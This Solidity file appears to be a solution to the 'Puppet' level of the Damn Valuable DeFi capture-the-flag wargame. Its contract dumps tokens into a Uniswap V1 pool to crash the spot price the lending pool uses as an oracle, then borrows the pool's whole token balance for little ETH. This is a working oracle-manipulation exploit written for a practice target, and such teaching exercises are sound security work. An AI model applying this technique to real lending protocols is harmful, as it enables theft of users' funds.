// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import { PuppetPool } from "../../08_puppet-v1/PuppetPool.sol";
import { DamnValuableToken } from "../../DamnValuableToken.sol";
import { IUniswapV1Exchange } from "../../../build-uniswap/v1/IUniswapV1Exchange.sol";

contract AttackPuppet {
    receive() external payable { }

    function attack(
        PuppetPool lendingPool,
        DamnValuableToken token,
        IUniswapV1Exchange uniswapExchange,
        address player
    )
        external
        payable
    {
        uint256 tokenPlayerBalance = 999 ether;
        token.approve(address(uniswapExchange), tokenPlayerBalance);
        // Convert ETH to Tokens and transfers Tokens to recipient.
        uniswapExchange.tokenToEthTransferInput(tokenPlayerBalance, 1, block.timestamp, address(this));

        uint256 tokenPoolBanace = 100_000 ether;
        uint256 depositingEthAmount = lendingPool.calculateDepositRequired(tokenPoolBanace);
        lendingPool.borrow{ value: depositingEthAmount }(tokenPoolBanace, player);
    }
}
